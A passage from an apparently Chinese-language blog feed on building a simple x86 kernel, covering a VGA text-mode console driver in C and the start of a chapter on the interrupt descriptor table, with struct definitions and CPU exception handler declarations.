class="line"></span><br><span class="line">&#125;<span class="type">real_color_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清屏</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">console_clear</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 屏幕输出一个字符带颜色</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">console_putc_color</span><span class="params">(<span class="type">char</span> c, <span class="type">real_color_t</span> back, <span class="type">real_color_t</span> fore)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 屏幕打印一个以 \0 结尾的字符串 默认黑底白字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">console_write</span><span class="params">(<span class="type">char</span> *cstr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 屏幕打印一个以\0结尾的字符串 带颜色</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">console_write_color</span><span class="params">(<span class="type">char</span> *cstr, <span class="type">real_color_t</span> back, <span class="type">real_color_t</span> fore)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 十六进制的整形术</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">console_write_hex</span><span class="params">(<span class="type">uint32_t</span> n, <span class="type">real_color_t</span> back, <span class="type">real_color_t</span> fore)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 十进制</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">console_write_dec</span><span class="params">(<span class="type">uint32_t</span> n, <span class="type">real_color_t</span> back, <span class="type">real_color_t</span> fore)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// include</span></span></span><br></pre></td></tr></table></figure>

<p><strong>使用枚举的好处</strong></p>
<ol>
<li><strong>提高代码可读性</strong>：使用枚举可以使代码更易读和维护。</li>
<li><strong>减少错误</strong>：枚举限制了<strong>变量可以接受的值，减少了错误的可能性</strong>。</li>
<li><strong>便于比较</strong>：枚举项可以很容易地进行比较和排序。</li>
<li><strong>方便维护</strong>：如果未来需要添加或修改值，枚举使得这些变更更加集中和统一。</li>
</ol>
<blockquote>
<p>driver&#x2F;console.c</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;console.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"><span class="comment">// VGA 的显示缓冲的起点 0xB8000</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint16_t</span> *video_memory = (<span class="type">uint16_t</span> *)<span class="number">0xB8000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 屏幕光标的坐标   static 限定 作用域</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint8_t</span> cursor_x = <span class="number">0</span>;  <span class="comment">// 光标的水平坐标</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint8_t</span> cursor_y = <span class="number">0</span>;  <span class="comment">// 光标的垂直坐标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 屏幕输入光标的移动</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">move_cursor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 屏幕80 字节宽</span></span><br><span class="line">    <span class="type">uint16_t</span> cursorLocation = cursor_y * <span class="number">80</span> + cursor_x;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// VGA 内部的寄存器多达300多个，显然无法一一映射到I/O端口的地址空间。</span></span><br><span class="line">	<span class="comment">// 对此 VGA 控制器的解决方案是，将一个端口作为内部寄存器的索引：0x3D4，</span></span><br><span class="line">	<span class="comment">// 再通过 0x3D5 端口来设置相应寄存器的值。</span></span><br><span class="line">	<span class="comment">// 在这里用到的两个内部寄存器的编号为14与15，分别表示光标位置的高8位与低8位。</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">outb</span>(<span class="number">0x3D4</span>, <span class="number">14</span>);                    <span class="comment">// VGA 我们要设置光标的高字节</span></span><br><span class="line">    <span class="built_in">outb</span>(<span class="number">0x3D5</span>, cursorLocation &gt;&gt; <span class="number">8</span>);   <span class="comment">// 发送高8位</span></span><br><span class="line">    <span class="built_in">outb</span>(<span class="number">0x3D4</span>, <span class="number">15</span>);                    <span class="comment">// 低字节</span></span><br><span class="line">    <span class="built_in">outb</span>(<span class="number">0x3D5</span>, cursorLocation);        <span class="comment">// 发送低8位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>变量定义</strong></p>
<ul>
<li><code>static uint16_t *video_memory = (uint16_t *)0xB8000;</code><ul>
<li>这是一个指向视频内存开始地址的指针，VGA文本模式通常从物理地址 <code>0xB8000</code> 开始。这块内存用于存放屏幕上显示的字符及其属性（如颜色）。</li>
<li><code>uint16_t</code> 表示每个内存位置可以存储16位数据，<strong>通常前8位是字符的ASCII码，后8位是字符的属性（前景色和背景色）</strong>。</li>
</ul>
</li>
</ul>
<p><strong><code>move_cursor</code> 函数</strong></p>
<ul>
<li><p>这个函数用于移动屏幕光标到由 <code>cursor_x</code> 和 <code>cursor_y</code> 指定的位置。</p>
</li>
<li><p><code>uint16_t cursorLocation = cursor_y * 80 + cursor_x;</code></p>
<ul>
<li>这行代码计算光标在video内存中的位置索引。因为每<strong>行有80个字符，所以每增加一行，索引增加80。</strong></li>
</ul>
</li>
<li><p><code>outb(0x3D4, 14);</code></p>
<ul>
<li>调用 <code>outb</code> 函数向端口 <code>0x3D4</code> 写入值 <code>14</code>。<code>0x3D4</code> 是VGA端口地址，用于指定接下来要设置的是光标位置的高字节。</li>
</ul>
</li>
<li><p><code>outb(0x3D5, cursorLocation &gt;&gt; 8);</code></p>
<ul>
<li>将光标位置的高8位（通过右移8位获得）写入VGA数据寄存器 <code>0x3D5</code>。</li>
</ul>
</li>
<li><p><code>outb(0x3D4, 15);</code></p>
<ul>
<li>再次向端口 <code>0x3D4</code> 写入值 <code>15</code>，指定接下来要设置的是光标位置的低字节。</li>
</ul>
</li>
<li><p><code>outb(0x3D5, cursorLocation);</code></p>
<ul>
<li>将光标位置的低8位直接写入VGA数据寄存器 <code>0x3D5</code>。</li>
</ul>
</li>
</ul>
<blockquote>
<p>清屏操作</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 清屏操作  实际上就是利用白底黑字的空格 覆盖</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">console_clear</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> attribute_byte = (<span class="number">0</span> &lt;&lt; <span class="number">4</span>) | (<span class="number">15</span> &amp; <span class="number">0x0F</span>);  <span class="comment">// 0x0F = 0x00001111</span></span><br><span class="line">    <span class="type">uint16_t</span> blank = <span class="number">0x20</span> | (attribute_byte &lt;&lt; <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">80</span> * <span class="number">25</span>; i++) &#123;</span><br><span class="line">        video_memory[i] = blank;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cursor_x = <span class="number">0</span>;</span><br><span class="line">    cursor_y = <span class="number">0</span>;</span><br><span class="line">    move_cursor();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>uint8_t attribute_byte = (0 &lt;&lt; 4) | (15 &amp; 0x0F);</code><ul>
<li>这行代码定义了字符的显示属性。VGA文本模式中每个字符占用两个字节：一个字节表示字符的ASCII码，另一个字节定义字符的显示属性（包括前景色和背景色）。</li>
<li><code>(0 &lt;&lt; 4)</code> 设置背景色为黑色（颜色代码0）。0 左移 4 位是因为背景色占据属性字节的高4位。</li>
<li><code>(15 &amp; 0x0F)</code> 设置前景色为白色（颜色代码15）。<code>&amp; 0x0F</code> 确保颜色代码不超过15，因为前景色占据低4位。</li>
</ul>
</li>
<li><code>uint16_t blank = 0x20 | (attribute_byte &lt;&lt; 8);</code><ul>
<li>将空格字符（ASCII码 0x20）和属性字节组合成一个16位的值。属性字节通过左移8位移到高字节位置，然后与空格字符的ASCII码合并。这样，<code>blank</code> 变量代表一个带有指定颜色属性的空格字符。</li>
</ul>
</li>
</ul>
<blockquote>
<p>屏幕滚动</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 屏幕滚动 就是将后24行的数据全部向上挪动一行 最后一行清空</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">scroll</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// attrbute_byte 被构造出一个黑底白字的描述格式</span></span><br><span class="line">    <span class="type">uint8_t</span> attribute_byte = (<span class="number">0</span> &lt;&lt; <span class="number">4</span>) | (<span class="number">15</span> &amp; <span class="number">0x0F</span>);</span><br><span class="line">    <span class="type">uint16_t</span> blank = <span class="number">0x20</span> | (attribute_byte &lt;&lt; <span class="number">8</span>);   <span class="comment">// space 是 0x20</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// cursor_y 到25的时候就该换行；</span></span><br><span class="line">    <span class="keyword">if</span> (cursor_y &gt;= <span class="number">25</span>) &#123;</span><br><span class="line">        <span class="comment">// 将所有的行显示数据复制到上一行 ，第一行永远消失</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span> * <span class="number">80</span>; i &lt; <span class="number">24</span> * <span class="number">80</span>; i++) &#123;</span><br><span class="line">            video_memory[i] = video_memory[i + <span class="number">80</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 最后一行填充数据</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">24</span>* <span class="number">80</span>; i &lt; <span class="number">25</span>* <span class="number">80</span>; i++) &#123;</span><br><span class="line">            video_memory[i] = blank;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 向上移动一行 所以cursor_y = 24</span></span><br><span class="line">        cursor_y = <span class="number">24</span>;</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上同理</p>
<blockquote>
<p>显示字符</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 显示字符串</span></span><br><span class="line"><span class="comment">// 先实现一个字符</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">console_putc_color</span><span class="params">(<span class="type">char</span> c, <span class="type">real_color_t</span> back, <span class="type">real_color_t</span> fore)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> back_color = (<span class="type">uint8_t</span>)back;</span><br><span class="line">    <span class="type">uint8_t</span> fore_color = (<span class="type">uint8_t</span>)fore;</span><br><span class="line">	<span class="comment">//背景颜色左移4位，与前景色进行位或操作，合成一个字节的颜色属性。</span></span><br><span class="line">    <span class="type">uint8_t</span> attribute_byte = (back_color &lt;&lt; <span class="number">4</span>) | (fore_color &amp; <span class="number">0x0F</span>);</span><br><span class="line">    <span class="type">uint16_t</span> attribute = attribute_byte &lt;&lt; <span class="number">8</span>; <span class="comment">// 将属性字节左移8位，以便与字符的ASCII值合并形成16位的值，用于直接写入video内存</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0x08 是退格的ASCII</span></span><br><span class="line">    <span class="comment">// 0x09 是tab</span></span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">0x08</span> &amp;&amp; cursor_x) &#123;</span><br><span class="line">        cursor_x--; <span class="comment">// 退格</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="number">0x09</span>) &#123;</span><br><span class="line">        cursor_x = (cursor_x + <span class="number">8</span>) &amp; ~(<span class="number">8</span> - <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;\r&#x27;</span>) &#123;</span><br><span class="line">        cursor_x = <span class="number">0</span>; <span class="comment">// </span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">        cursor_x = <span class="number">0</span>;</span><br><span class="line">        cursor_y++; <span class="comment">// 换行</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">        video_memory[cursor_y* <span class="number">80</span> + cursor_x] = c | attribute;</span><br><span class="line">        cursor_x++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 超过80 换行</span></span><br><span class="line">    <span class="keyword">if</span> (cursor_x &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        cursor_x = <span class="number">0</span>;</span><br><span class="line">        cursor_y++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    scroll();</span><br><span class="line"></span><br><span class="line">    move_cursor();</span><br><span class="line">&#125;     </span><br></pre></td></tr></table></figure>



<blockquote>
<p>字符串输出</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// yijuhua</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">console_write</span><span class="params">(<span class="type">char</span>*cstr)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(*cstr) &#123;</span><br><span class="line">        console_putc_color(*cstr++, rc_black, rc_white);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 带颜色</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">console_write_color</span><span class="params">(<span class="type">char</span> *cstr, <span class="type">real_color_t</span> back, <span class="type">real_color_t</span> fore)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(*cstr) &#123;</span><br><span class="line">        console_putc_color(*cstr++, back, fore);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>16进制</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 16 nums</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">console_write_hex</span><span class="params">(<span class="type">uint32_t</span> n, <span class="type">real_color_t</span> back, <span class="type">real_color_t</span> fore)</span> &#123;</span><br><span class="line">    <span class="type">int</span> tmp;</span><br><span class="line">	<span class="type">char</span> noZeroes = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	console_write_color(<span class="string">&quot;0x&quot;</span>, back, fore); <span class="comment">// 先打印出0x</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 16进制转换</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">28</span>; i &gt;= <span class="number">0</span>; i -= <span class="number">4</span>) &#123;</span><br><span class="line">		tmp = (n &gt;&gt; i) &amp; <span class="number">0xF</span>;</span><br><span class="line">		<span class="keyword">if</span> (tmp == <span class="number">0</span> &amp;&amp; noZeroes != <span class="number">0</span>) &#123;</span><br><span class="line">		      <span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		noZeroes = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (tmp &gt;= <span class="number">0xA</span>) &#123;</span><br><span class="line">		      console_putc_color(tmp<span class="number">-0xA</span>+<span class="string">&#x27;a&#x27;</span>, back, fore);  <span class="comment">// 如果输出的数字大于等于10 A-F 则转换相应的小写字母进行输出</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		      console_putc_color(tmp+<span class="string">&#x27;0&#x27;</span>, back, fore);     <span class="comment">// 否则就正常输出</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>循环从28位开始，每次右移4位，直到0位。由于十六进制是基于4位二进制，这种方式可以每次处理一个十六进制数字。</p>
</li>
<li><pre><code>for (int i = 28; i &gt;= 0; i -= 4) &#123;
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  tmp = (n &gt;&gt; i) &amp; 0xF;</span><br></pre></td></tr></table></figure>

  - 通过右移和与操作，每次提取4位，转换为一个十六进制的数字（0-15）。

- ```
  if (tmp == 0 &amp;&amp; noZeroes != 0) &#123; continue; &#125;
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - 如果提取的数字为0，并且还未遇到任何非零数字，则跳过当前循环迭代，不输出该零。</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  noZeroes = 0;</span><br></pre></td></tr></table></figure>

  - 一旦输出了第一个非零数字，将 `noZeroes` 设为0，以允许后续的零被输出。
</code></pre>
</li>
</ul>
<blockquote>
<p>10进制</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 10 nums</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">console_write_dec</span><span class="params">(<span class="type">uint32_t</span> n, <span class="type">real_color_t</span> back, <span class="type">real_color_t</span> fore)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">		console_putc_color(<span class="string">&#x27;0&#x27;</span>, back, fore);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span> acc = n;</span><br><span class="line">	<span class="type">char</span> c[<span class="number">32</span>];</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (acc &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		c[i] = <span class="string">&#x27;0&#x27;</span> + acc % <span class="number">10</span>;</span><br><span class="line">		acc /= <span class="number">10</span>;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	c[i] = <span class="number">0</span>;  <span class="comment">// 字符串终结符</span></span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> c2[<span class="number">32</span>];</span><br><span class="line">	c2[i--] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">	      c2[i--] = c[j++];  <span class="comment">// 反转字符串</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	console_write_color(c2, back, fore);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><pre><code class="c">while (acc &gt; 0) &#123; c[i] = &#39;0&#39; + acc % 10; acc /= 10; i++; &#125;
</code></pre>
<ul>
<li>循环直到 <code>acc</code> 为0。每次循环取出 <code>acc</code> 的最低位（<code>acc % 10</code>），加上字符 ‘0’ 转换成对应的字符，存入 <code>c[i]</code>，然后 <code>acc</code> 除以10准备下一次迭代。</li>
</ul>
</li>
</ul>
<blockquote>
<p>执行make clean</p>
<p>make</p>
<p>make qemu</p>
</blockquote>
<p><img src="/2024/04/12/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0%5Cimage-20240507165856179.png" alt="image-20240507165856179"></p>
]]></content>
      <categories>
        <category>x86内核实现</category>
      </categories>
      <tags>
        <tag>x86</tag>
        <tag>linxu</tag>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>x86-4-中断描述符</title>
    <url>/2024/05/10/x86-4-%E4%B8%AD%E6%96%AD%E6%8F%8F%E8%BF%B0%E7%AC%A6/</url>
    <content><![CDATA[<h1 id="7-添加中断描述符表"><a href="#7-添加中断描述符表" class="headerlink" title="7.添加中断描述符表"></a>7.添加中断描述符表</h1><h2 id="中断执行的流程"><a href="#中断执行的流程" class="headerlink" title="中断执行的流程:"></a><strong>中断执行的流程:</strong></h2><ol>
<li>当某个中断发生时，典型的处理方式就是CPU会 打断当前的任务，保留当前的执行现场</li>
<li>再转移到该中断事先安排好的中断处理函数去执行。</li>
<li>在中断处理函数执行结束之后再恢复中断之前的执行现场，去执行之前的任务。</li>
</ol>
<p><strong>中断描述符表（IDT，interrupt descriptor table）</strong>   与gdt 类似的 也有一个中断描述符表寄存器 记录这个表的起始地址</p>
<p><img src="/2024/05/10/x86-4-%E4%B8%AD%E6%96%AD%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20240512141659651.png" alt="image-20240512141659651"></p>
<blockquote>
<h2 id="include-idt-h-定义"><a href="#include-idt-h-定义" class="headerlink" title="include&#x2F;idt.h  定义"></a>include&#x2F;idt.h  定义</h2></blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_IDT_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_IDT_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// init</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_idt</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中断</span></span><br><span class="line"><span class="keyword">typedef</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idt_entry_t</span> &#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> base_lo;     <span class="comment">// 中断处理函数地址的 15 - 0 位 </span></span><br><span class="line">    <span class="type">uint16_t</span> sel;         <span class="comment">// 目标代码段描述符选择子</span></span><br><span class="line">    <span class="type">uint8_t</span> always0;      <span class="comment">// 置0 </span></span><br><span class="line">    <span class="type">uint8_t</span> flags;        <span class="comment">// 标志</span></span><br><span class="line">    <span class="type">uint16_t</span> base_hi;     <span class="comment">// 函数地址31 - 16 位</span></span><br><span class="line">&#125;__attribute__((packed)) <span class="type">idt_entry_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IDTR</span></span><br><span class="line"><span class="keyword">typedef</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idt_ptr_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> limit;       <span class="comment">// 限长</span></span><br><span class="line">    <span class="type">uint32_t</span> base;        <span class="comment">// 基址</span></span><br><span class="line">&#125;__attribute__((packed)) <span class="type">idt_ptr_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  <span class="comment">// include</span></span></span><br></pre></td></tr></table></figure>



<p>按照Intel的规定，0～19号中断属于CPU所有62，而且第 20-31号中断也被Intel保留，所以从32～255号才属于用户自定义中断。虽说是”用户自定 义”，其实在x86上有些中断按照习惯还是给予了固定的设备。比如32号是timer中断，33 号是键盘中断等等。</p>
<p><strong>虽然cpu在中断产生的时候自动保存了部分的执行现场，但是依然有很多寄存器需要我们自己保存和恢复</strong></p>
<blockquote>
<p>include&#x2F;idt.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs_t</span>&#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> ds;         <span class="comment">// 用于保护用户的数据段描述法</span></span><br><span class="line">    <span class="type">uint32_t</span> edi;        <span class="comment">// 从 edi 到 eax 由pusha 指令压入</span></span><br><span class="line">    <span class="type">uint32_t</span> esi;</span><br><span class="line">    <span class="type">uint32_t</span> ebp;</span><br><span class="line">    <span class="type">uint32_t</span> esp;</span><br><span class="line">    <span class="type">uint32_t</span> ebx;</span><br><span class="line">    <span class="type">uint32_t</span> edx;</span><br><span class="line">    <span class="type">uint32_t</span> ecx;</span><br><span class="line">    <span class="type">uint32_t</span> eax;</span><br><span class="line">    <span class="type">uint32_t</span> int_no;     <span class="comment">// 中断号</span></span><br><span class="line">    <span class="type">uint32_t</span> err_code;   <span class="comment">// 错误代码有中断错误代码的中断会由 </span></span><br><span class="line">    <span class="type">uint32_t</span> eip;        <span class="comment">// 以下处理器自动压入</span></span><br><span class="line">    <span class="type">uint32_t</span> cs;</span><br><span class="line">    <span class="type">uint32_t</span> eflags;</span><br><span class="line">    <span class="type">uint32_t</span> useresp;</span><br><span class="line">    <span class="type">uint32_t</span> ss;</span><br><span class="line">&#125;pt_regs;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义中断处理函数指针</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*<span class="type">interrupt_handler_t</span>)</span> <span class="params">(pt_regs *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中断处理函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_interrupt_handler</span><span class="params">(<span class="type">uint8_t</span> n, <span class="type">interrupt_handler_t</span> h)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用中断处理函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr_handler</span><span class="params">(pt_regs *regs)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明0 - 19 属于cpu的异常中断</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr0</span><span class="params">()</span>; <span class="comment">// 0 #DE 除 0 异常</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr1</span><span class="params">()</span>; <span class="comment">// 1 #DB 调试异常</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr2</span><span class="params">()</span>; <span class="comment">// 2 NMI</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr3</span><span class="params">()</span>; <span class="comment">// 3 BP 断点异常</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr4</span><span class="params">()</span>; <span class="comment">// 4 #OF 溢出</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr5</span><span class="params">()</span>; <span class="comment">// 5 #BR 对数组的引用超出边界</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr6</span><span class="params">()</span>; <span class="comment">// 6 #UD 无效或未定义的操作码</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr7</span><span class="params">()</span>; <span class="comment">// 7 #NM 设备不可用无数学协处理器()</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr8</span><span class="params">()</span>; <span class="comment">// 8 #DF 双重故障有错误代码()</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr9</span><span class="params">()</span>; <span class="comment">// 9 协处理器跨段操作</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr10</span><span class="params">()</span>; <span class="comment">// 10 #TS 无效TSS有错误代码()</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr11</span><span class="params">()</span>; <span class="comment">// 11 #NP 段不存在有错误代码()</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr12</span><span class="params">()</span>; <span class="comment">// 12 #SS 栈错误有错误代码()</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr13</span><span class="params">()</span>; <span class="comment">// 13 #GP 常规保护有错误代码()</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr14</span><span class="params">()</span>; <span class="comment">// 14 #PF 页故障有错误代码()</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr15</span><span class="params">()</span>; <span class="comment">// 15 CPU 保留</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr16</span><span class="params">()</span>; <span class="comment">// 16 #MF 浮点处理单元错误</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr17</span><span class="params">()</span>; <span class="comment">// 17 #AC 对齐检查</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr18</span><span class="params">()</span>; <span class="comment">// 18 #MC 机器检查</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr19</span><span class="params">()</span>; <span class="comment">// 19 #XM SIMD单指令多数据()浮点异常</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 20 ~ 31 Intel 保留</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr20</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">isr21</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">isr22</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">isr23</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">isr24</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">isr25</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">isr26</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">isr27</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">isr28</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">isr29</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">isr30</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">isr31</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 32 ~ 255 用户自定义异常</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr255</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>



<p>把原本的中断处理函数逻辑上拆解为三部分，<strong>第一部分是一致 的现场保护操作；第二部分是每个中断特有的处理逻辑；第三部分又是一致的现场恢复。</strong></p>
<p>实际上拆分成了四段。</p>
<blockquote>
<p>idt&#x2F;idt_s.s</p>
